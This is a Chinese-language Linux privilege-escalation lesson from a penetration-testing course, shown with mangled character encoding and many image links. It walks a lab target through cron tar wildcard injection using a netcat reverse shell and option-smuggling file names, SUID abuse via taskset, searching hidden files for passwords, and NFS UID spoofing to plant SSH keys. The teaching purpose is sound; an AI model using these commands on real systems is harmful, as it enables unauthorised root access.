# è¯¾ç¨‹P75ï¼šç¬¬44å¤© - Linuxæƒé™æå‡å®æˆ˜æ•™ç¨‹ ğŸ”“

![](img/9ebd2d50a51785f5f4565fe95a8048b8_0.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_1.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ Linuxç³»ç»Ÿä¸­å‡ ç§å¸¸è§çš„æƒé™æå‡æ–¹æ³•ï¼ŒåŒ…æ‹¬å®šæ—¶ä»»åŠ¡ææƒã€SUIDææƒä»¥åŠé€šè¿‡NFSå…±äº«å’Œéšè—æ–‡ä»¶è·å–æ›´é«˜æƒé™ã€‚è¯¾ç¨‹å†…å®¹å°†ç»“åˆå®ä¾‹ï¼ŒåŠ›æ±‚ç®€å•ç›´ç™½ï¼Œè®©åˆå­¦è€…èƒ½å¤Ÿçœ‹æ‡‚ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_3.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_5.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_7.png)

## æ¦‚è¿° ğŸ“‹

æƒé™æå‡æ˜¯æ¸—é€æµ‹è¯•ä¸­çš„å…³é”®ç¯èŠ‚ï¼Œå®ƒå…è®¸æ”»å‡»è€…ä»ä¸€ä¸ªä½æƒé™è´¦æˆ·è·å–ç³»ç»Ÿæ›´é«˜æƒé™ï¼ˆå¦‚rootï¼‰ã€‚æœ¬èŠ‚è¯¾å°†æ·±å…¥æ¢è®¨å‡ ç§åœ¨Linuxç¯å¢ƒä¸‹å®ç”¨çš„ææƒæŠ€æœ¯ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_9.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_11.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_13.png)

---

![](img/9ebd2d50a51785f5f4565fe95a8048b8_15.png)

## ç¬¬ä¸€éƒ¨åˆ†ï¼šLinuxå®šæ—¶ä»»åŠ¡ææƒ â°

![](img/9ebd2d50a51785f5f4565fe95a8048b8_17.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_19.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†SUDOæ»¥ç”¨æƒé™çš„ææƒæ–¹æ³•ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•åˆ©ç”¨Linuxçš„å®šæ—¶ä»»åŠ¡è¿›è¡Œææƒã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_21.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_23.png)

### ä»€ä¹ˆæ˜¯å®šæ—¶ä»»åŠ¡ï¼Ÿ

![](img/9ebd2d50a51785f5f4565fe95a8048b8_25.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_27.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_29.png)

åœ¨Linuxç³»ç»Ÿä¸­ï¼Œå®šæ—¶ä»»åŠ¡ç”± `cron` å®ˆæŠ¤è¿›ç¨‹ç®¡ç†ï¼Œå®ƒå…è®¸ç”¨æˆ·åœ¨ç‰¹å®šæ—¶é—´è‡ªåŠ¨æ‰§è¡Œå‘½ä»¤æˆ–è„šæœ¬ã€‚æˆ‘ä»¬åœ¨ä¿¡æ¯æ”¶é›†é˜¶æ®µï¼Œå°±éœ€è¦å…³æ³¨ç³»ç»Ÿçš„å®šæ—¶ä»»åŠ¡é…ç½®ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_31.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_33.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_35.png)

ç³»ç»Ÿçº§çš„å®šæ—¶ä»»åŠ¡é…ç½®æ–‡ä»¶ä½äº `/etc/crontab`ã€‚ç”¨æˆ·çº§çš„å®šæ—¶ä»»åŠ¡åˆ™ä½äº `/var/spool/cron/crontabs/` ç›®å½•ä¸‹ï¼Œæ¯ä¸ªç”¨æˆ·å¯¹åº”ä¸€ä¸ªæ–‡ä»¶ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_37.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_39.png)

### å®šæ—¶ä»»åŠ¡æ ¼å¼è§£æ

æˆ‘ä»¬å¯ä»¥é€šè¿‡ `cat /etc/crontab` å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ã€‚å…¶åŸºæœ¬æ ¼å¼å¦‚ä¸‹ï¼š

![](img/9ebd2d50a51785f5f4565fe95a8048b8_41.png)

```
* * * * * user command
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_43.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_45.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_47.png)

è¿™äº”ä¸ªæ˜Ÿå·åˆ†åˆ«ä»£è¡¨ï¼š**åˆ†ã€æ—¶ã€æ—¥ã€æœˆã€å‘¨**ã€‚`user` æŒ‡å®šä»¥å“ªä¸ªç”¨æˆ·çš„æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œ`command` åˆ™æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_49.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_50.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_52.png)

ä¾‹å¦‚ï¼Œ`* * * * * root /path/to/backup.sh` è¡¨ç¤ºä»¥rootæƒé™æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡å¤‡ä»½è„šæœ¬ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_54.png)

### é¶åœºå®ä¾‹åˆ†æ

![](img/9ebd2d50a51785f5f4565fe95a8048b8_56.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_58.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_60.png)

åœ¨æˆ‘ä»¬çš„é¶æœºä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªç³»ç»Ÿå®šæ—¶ä»»åŠ¡ï¼š

![](img/9ebd2d50a51785f5f4565fe95a8048b8_62.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_64.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_66.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_68.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_70.png)

```bash
* * * * * root /usr/local/bin/backup.sh
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_72.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_74.png)

è¿™ä¸ªä»»åŠ¡ä»¥rootæƒé™æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ `/usr/local/bin/backup.sh` è„šæœ¬ã€‚æˆ‘ä»¬éœ€è¦åˆ†æè¿™ä¸ªè„šæœ¬çš„åŠŸèƒ½ï¼Œæ‰èƒ½æ‰¾åˆ°åˆ©ç”¨ç‚¹ã€‚

æŸ¥çœ‹è„šæœ¬å†…å®¹ï¼š

![](img/9ebd2d50a51785f5f4565fe95a8048b8_76.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_78.png)

```bash
#!/bin/bash
for i in $(ls /home); do
    cd /home/$i
    tar -zcf /etc/backups/$i.tar.gz *
done
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_80.png)

**è„šæœ¬åˆ†æï¼š**
1.  éå† `/home` ç›®å½•ä¸‹çš„æ‰€æœ‰ç”¨æˆ·æ–‡ä»¶å¤¹ï¼ˆä¾‹å¦‚ bob, peter, susanï¼‰ã€‚
2.  è¿›å…¥æ¯ä¸ªç”¨æˆ·çš„homeç›®å½•ã€‚
3.  ä½¿ç”¨ `tar` å‘½ä»¤å°†è¯¥ç›®å½•ä¸‹çš„**æ‰€æœ‰æ–‡ä»¶**ï¼ˆ`*` é€šé…ç¬¦ï¼‰æ‰“åŒ…å‹ç¼©ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_82.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_84.png)

è¿™ä¸ªè„šæœ¬çš„åŠŸèƒ½æ˜¯å®šæœŸå¤‡ä»½æ‰€æœ‰ç”¨æˆ·homeç›®å½•çš„æ–‡ä»¶ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_86.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_88.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_90.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_92.png)

### æ¼æ´åˆ©ç”¨ï¼šé€šé…ç¬¦æ³¨å…¥

![](img/9ebd2d50a51785f5f4565fe95a8048b8_94.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_96.png)

è¿™ä¸ªè„šæœ¬çœ‹ä¼¼æ­£å¸¸ï¼Œä½†å…¶æ¼æ´åœ¨äº `tar -zcf /etc/backups/$i.tar.gz *` è¿™ä¸€è¡Œä¸­å¯¹é€šé…ç¬¦ `*` çš„ä½¿ç”¨ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_98.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_100.png)

**é€šé…ç¬¦åŸºç¡€ï¼š**
åœ¨Linuxä¸­ï¼Œ`*` é€šé…ç¬¦ä¼šåŒ¹é…å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚å½“å‘½ä»¤å¦‚ `cp *.txt /tmp` æ‰§è¡Œæ—¶ï¼ŒShellä¼šå…ˆå°† `*.txt` å±•å¼€ä¸ºæ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶åï¼Œå†æ‰§è¡Œå‘½ä»¤ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_102.png)

**æ¼æ´åŸç†ï¼š**
`tar` å‘½ä»¤æœ‰å¾ˆå¤šé€‰é¡¹ï¼ˆoptionsï¼‰ã€‚å¦‚æœæˆ‘ä»¬åœ¨æ–‡ä»¶åä¸Šåšæ‰‹è„šï¼Œè®© `tar` å‘½ä»¤å°†æ–‡ä»¶åè¯¯è®¤ä¸ºæ˜¯å®ƒçš„é€‰é¡¹ï¼Œå°±å¯èƒ½æ‰§è¡Œæˆ‘ä»¬é¢„æœŸçš„æ“ä½œã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_104.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_106.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_108.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_110.png)

`tar` æœ‰ä¸€ä¸ª `--checkpoint-action` é€‰é¡¹ï¼Œå¯ä»¥æŒ‡å®šåœ¨æ£€æŸ¥ç‚¹æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_112.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_114.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_116.png)

ä»¥ä¸‹æ˜¯åˆ©ç”¨æ­¥éª¤ï¼š

![](img/9ebd2d50a51785f5f4565fe95a8048b8_118.png)

1.  **åœ¨ä½æƒé™ç”¨æˆ·çš„homeç›®å½•ï¼ˆä¾‹å¦‚ `/home/bob`ï¼‰ä¸‹åˆ›å»ºç‰¹æ®Šæ–‡ä»¶ï¼š**

    ```bash
    # 1. åˆ›å»ºä¸€ä¸ªåŒ…å«åå¼¹Shellå‘½ä»¤çš„è„šæœ¬
    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f' > shell.sh

    # 2. åˆ›å»ºä¸¤ä¸ªç”¨äºâ€œæ¬ºéª—â€tarå‘½ä»¤çš„æ–‡ä»¶
    echo '' > '--checkpoint=1'
    echo '' > '--checkpoint-action=exec=sh shell.sh'
    ```

    æ‰§è¡Œåï¼Œåœ¨ `/home/bob` ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸‰ä¸ªæ–‡ä»¶ï¼š`shell.sh`ã€`--checkpoint=1` å’Œ `--checkpoint-action=exec=sh shell.sh`ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_120.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_122.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_124.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_125.png)

2.  **ç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼š**
    å½“rootç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡æ‰§è¡Œåˆ°å¤‡ä»½ `/home/bob` ç›®å½•æ—¶ï¼Œå®é™…çš„å‘½ä»¤ä¼šå±•å¼€ä¸ºï¼š

    ```bash
    tar -zcf /etc/backups/bob.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh
    ```

    `tar` å‘½ä»¤ä¼šå°† `--checkpoint=1` å’Œ `--checkpoint-action=exec=sh shell.sh` è¯†åˆ«ä¸º**é€‰é¡¹**ï¼Œè€Œä¸æ˜¯æ™®é€šæ–‡ä»¶åã€‚è¿™æ ·ï¼Œå®ƒå°±ä¼šæ‰§è¡Œ `sh shell.sh` è¿™ä¸ªåŠ¨ä½œã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_127.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_129.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_131.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_132.png)

3.  **è·å–Root Shellï¼š**
    ç”±äºå®šæ—¶ä»»åŠ¡æ˜¯ä»¥rootæƒé™è¿è¡Œçš„ï¼Œå®ƒæ‰§è¡Œçš„ `shell.sh` ä¹Ÿä¼šè·å¾—rootæƒé™ã€‚`shell.sh` ä¸­çš„å‘½ä»¤ä¼šå‘æ”»å‡»è€…æœºå™¨ï¼ˆ192.168.1.100:4444ï¼‰åå¼¹ä¸€ä¸ªå…·æœ‰rootæƒé™çš„Shellã€‚

é€šè¿‡è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å°±æˆåŠŸåœ°ä»æ™®é€šç”¨æˆ·bobæå‡åˆ°äº†rootæƒé™ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_134.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_136.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_138.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_140.png)

**æ‰©å±•æ€è·¯ï¼š**
åœ¨ `shell.sh` ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥åå¼¹Shellï¼Œè¿˜å¯ä»¥åšå…¶ä»–äº‹ï¼Œä¾‹å¦‚ï¼š
*   åœ¨ `/etc/sudoers` æ–‡ä»¶ä¸­æ·»åŠ å½“å‰ç”¨æˆ·ï¼Œä½¿å…¶å¯ä»¥æ— å¯†ç ä½¿ç”¨sudoã€‚
*   ç»™ `/bin/bash` ç­‰å‘½ä»¤è®¾ç½®SUIDæƒé™ï¼Œç„¶ååˆ©ç”¨å®ƒææƒã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_142.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_144.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_146.png)

---

![](img/9ebd2d50a51785f5f4565fe95a8048b8_148.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_150.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_152.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_153.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_155.png)

## ç¬¬äºŒéƒ¨åˆ†ï¼šSUIDææƒ ğŸ›¡ï¸

![](img/9ebd2d50a51785f5f4565fe95a8048b8_157.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_159.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_161.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_162.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_164.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬åˆ©ç”¨äº†å®šæ—¶ä»»åŠ¡ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦ä¸€ç§ç»å…¸ææƒæ–¹å¼â€”â€”SUIDææƒã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_166.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_168.png)

### SUIDæƒé™å›é¡¾

![](img/9ebd2d50a51785f5f4565fe95a8048b8_170.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_172.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_174.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_176.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_177.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_178.png)

SUIDï¼ˆSet User IDï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶æƒé™ã€‚å½“ä¸€ä¸ªå…·æœ‰SUIDæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶è¢«è¿è¡Œæ—¶ï¼Œå®ƒå°†**ä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„èº«ä»½**è¿è¡Œï¼Œè€Œä¸æ˜¯æ‰§è¡Œå®ƒçš„ç”¨æˆ·ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_180.png)

ä¾‹å¦‚ï¼Œå¦‚æœ `/usr/bin/passwd` è®¾ç½®äº†SUIDä¸”å±äºrootï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·æ‰§è¡Œå®ƒæ—¶ï¼Œä¼šåœ¨çŸ­æ—¶é—´å†…æ‹¥æœ‰rootæƒé™æ¥ä¿®æ”¹å¯†ç ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_182.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_184.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_185.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_186.png)

### å¯»æ‰¾å¯åˆ©ç”¨çš„SUIDæ–‡ä»¶

![](img/9ebd2d50a51785f5f4565fe95a8048b8_188.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_190.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_192.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_194.png)

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç³»ç»Ÿä¸­å¯»æ‰¾è®¾ç½®äº†SUIDæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

![](img/9ebd2d50a51785f5f4565fe95a8048b8_196.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_198.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_200.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_202.png)

```bash
find / -type f -perm -u=s 2>/dev/null
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_204.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_206.png)

è¿™ä¸ªå‘½ä»¤ä¼šåœ¨æ ¹ç›®å½• `/` ä¸‹æŸ¥æ‰¾æ‰€æœ‰è®¾ç½®äº†SUIDä½ï¼ˆ`-perm -u=s`ï¼‰çš„æ™®é€šæ–‡ä»¶ï¼ˆ`-type f`ï¼‰ï¼Œå¹¶å°†é”™è¯¯ä¿¡æ¯ï¼ˆ`2>/dev/null`ï¼‰ä¸¢å¼ƒã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_208.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_210.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_212.png)

### åˆ©ç”¨å·²çŸ¥çš„SUIDç¨‹åº

![](img/9ebd2d50a51785f5f4565fe95a8048b8_214.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_216.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_218.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_220.png)

æ‰¾åˆ°SUIDæ–‡ä»¶åï¼Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­å“ªäº›å¯ä»¥è¢«åˆ©ç”¨ã€‚ä¸€ä¸ªè‘—åçš„èµ„æºæ˜¯ [GTFOBins](https://gtfobins.github.io/)ï¼Œå®ƒåˆ—å‡ºäº†å¤§é‡å¯ä»¥é€šè¿‡é…ç½®ä¸å½“çš„SUID/GUIDæƒé™è¿›è¡Œææƒçš„ç¨‹åºã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_222.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_223.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_224.png)

ä¾‹å¦‚ï¼Œå¦‚æœå‘ç° `taskset` å‘½ä»¤å…·æœ‰SUIDæƒé™ï¼Œå¹¶ä¸”å±äºrootï¼Œå¯ä»¥åˆ©ç”¨ä»¥ä¸‹æ–¹å¼ææƒï¼š

```bash
# åœ¨GTFOBinsä¸Šæ‰¾åˆ°çš„tasksetææƒå‘½ä»¤
taskset 1 /bin/bash -p
```
æ‰§è¡Œåï¼Œå¯èƒ½ä¼šç›´æ¥è·å¾—ä¸€ä¸ªrootæƒé™çš„bash shellï¼ˆ`-p` å‚æ•°ç”¨äºä¿ç•™ç‰¹æƒï¼‰ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_226.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_227.png)

**å®è·µå»ºè®®ï¼š**
å°† `find` å‘½ä»¤æ‰¾åˆ°çš„SUIDç¨‹åºåˆ—è¡¨ä¸GTFOBinsç½‘ç«™è¿›è¡Œæ¯”å¯¹ï¼Œå°è¯•åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚è¿™æ˜¯ä¸€ä¸ªéœ€è¦è€å¿ƒå°è¯•çš„è¿‡ç¨‹ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_229.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_231.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_233.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_235.png)

---

## ç¬¬ä¸‰éƒ¨åˆ†ï¼šå…¶ä»–ææƒæ€è·¯ ğŸ”

é™¤äº†ä¸Šè¿°ä¸¤ç§ä¸»è¦æ–¹æ³•ï¼Œä¿¡æ¯æ”¶é›†è¿‡ç¨‹ä¸­è¿˜å¯èƒ½å‘ç°å…¶ä»–ææƒè·¯å¾„ã€‚

### æŸ¥æ‰¾éšè—çš„æ•æ„Ÿæ–‡ä»¶

![](img/9ebd2d50a51785f5f4565fe95a8048b8_237.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_239.png)

ç”¨æˆ·æœ‰æ—¶ä¼šå°†å¯†ç ã€å¯†é’¥ç­‰æ•æ„Ÿä¿¡æ¯ä¿å­˜åœ¨éšè—æ–‡ä»¶ï¼ˆä»¥ `.` å¼€å¤´çš„æ–‡ä»¶ï¼‰ä¸­ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•æœç´¢è¿™äº›æ–‡ä»¶ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_241.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_243.png)

```bash
find /home -type f -name â€œ.*â€ 2>/dev/null
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_245.png)

è¿™ä¸ªå‘½ä»¤åœ¨ `/home` ç›®å½•ä¸‹æŸ¥æ‰¾æ‰€æœ‰éšè—æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œå¯èƒ½å‘ç°ä¸€ä¸ªåä¸º `/home/susan/.secret` çš„æ–‡ä»¶ï¼Œé‡Œé¢å­˜æ”¾ç€ç”¨æˆ·susançš„å¯†ç ã€‚è·å¾—è¿™ä¸ªå¯†ç åï¼Œå°±å¯ä»¥åˆ‡æ¢åˆ°susanç”¨æˆ·ï¼Œè¿›è€Œæ¢ç´¢è¯¥ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰æ›´é«˜æƒé™ï¼ˆä¾‹å¦‚åœ¨ `sudoers` åˆ—è¡¨ä¸­ï¼‰ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_247.png)

### NFSä½æƒé™è®¿é—®ææƒ

![](img/9ebd2d50a51785f5f4565fe95a8048b8_249.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_251.png)

NFSï¼ˆç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼‰å…è®¸åœ¨ç½‘ç»œä¸­å…±äº«ç›®å½•ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½å…è®¸æœªæˆæƒè®¿é—®æˆ–æƒé™æå‡ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_253.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_255.png)

1.  **ä¿¡æ¯æ”¶é›†ï¼š** ä½¿ç”¨ `showmount -e <target_ip>` å‘½ä»¤æŸ¥çœ‹ç›®æ ‡æœåŠ¡å™¨å…±äº«äº†å“ªäº›ç›®å½•ã€‚
    ```bash
    showmount -e 192.168.78.38
    # å¯èƒ½è¾“å‡ºï¼š/home/peter
    ```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_257.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_259.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_261.png)

2.  **æŒ‚è½½å…±äº«ç›®å½•ï¼š** åœ¨æ”»å‡»æœºä¸Šåˆ›å»ºç›®å½•å¹¶æŒ‚è½½ç›®æ ‡çš„å…±äº«ç›®å½•ã€‚
    ```bash
    mkdir /mnt/peter
    mount -t nfs 192.168.78.38:/home/peter /mnt/peter
    ```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_263.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_265.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_267.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_269.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_270.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_271.png)

3.  **æƒé™é—®é¢˜ï¼š** æŒ‚è½½åæŸ¥çœ‹æ–‡ä»¶æƒé™ï¼Œå¯èƒ½ä¼šæ˜¾ç¤ºæ•°å­—IDï¼ˆå¦‚ `1001`ï¼‰ï¼Œè¿™æ˜¯å› ä¸ºæ”»å‡»æœºä¸Šæ²¡æœ‰å¯¹åº”çš„ç”¨æˆ·/ç»„åã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_273.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_275.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_276.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_278.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_280.png)

4.  **æƒé™ä¼ªé€ ï¼š**
    *   åœ¨æ”»å‡»æœºä¸Šåˆ›å»ºä¸€ä¸ªä¸ç›®æ ‡å…±äº«ç›®å½•æ‰€æœ‰è€…UID/GIDç›¸åŒçš„ç”¨æˆ·ã€‚
    ```bash
    groupadd -g 1005 peter
    useradd -u 1001 -g 1005 peter
    passwd peter # è®¾ç½®å¯†ç 
    ```
    *   åˆ‡æ¢åˆ°è¯¥ç”¨æˆ· (`su peter`)ï¼Œæ­¤æ—¶å°±æ‹¥æœ‰äº†å¯¹è¯¥æŒ‚è½½ç›®å½•çš„å†™å…¥æƒé™ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_281.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_283.png)

5.  **å†™å…¥SSHå…¬é’¥ï¼š**
    *   åœ¨æ”»å‡»æœºç”ŸæˆSSHå¯†é’¥å¯¹ï¼š`ssh-keygen`
    *   å°†å…¬é’¥ï¼ˆ`~/.ssh/id_rsa.pub`ï¼‰å†™å…¥æŒ‚è½½ç›®å½•çš„ `~/.ssh/authorized_keys` æ–‡ä»¶ä¸­ã€‚
    *   ç°åœ¨å¯ä»¥é€šè¿‡SSHå…å¯†ç™»å½•åˆ°ç›®æ ‡æœåŠ¡å™¨çš„peterç”¨æˆ·ï¼š`ssh peter@192.168.78.38`

![](img/9ebd2d50a51785f5f4565fe95a8048b8_285.png)

6.  **è¿›ä¸€æ­¥çš„ææƒï¼š** ç™»å½•åï¼Œæ£€æŸ¥æ–°è·å¾—çš„ç”¨æˆ·æƒé™ã€‚å¦‚æœå‘ç°è¯¥ç”¨æˆ·å±äº `docker` ç»„ï¼Œåˆ™å¯ä»¥åˆ©ç”¨Dockerææƒã€‚å› ä¸ºDockerç»„çš„æˆå‘˜å¯ä»¥è¿è¡ŒDockerå®¹å™¨ï¼Œå¹¶å¯èƒ½å°†ä¸»æœºç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ï¼Œä»è€Œè®¿é—®æˆ–ä¿®æ”¹å®¿ä¸»æœºæ–‡ä»¶ï¼Œæœ€ç»ˆè·å¾—rootæƒé™ã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_287.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_289.png)

---

## æ€»ç»“ ğŸ¯

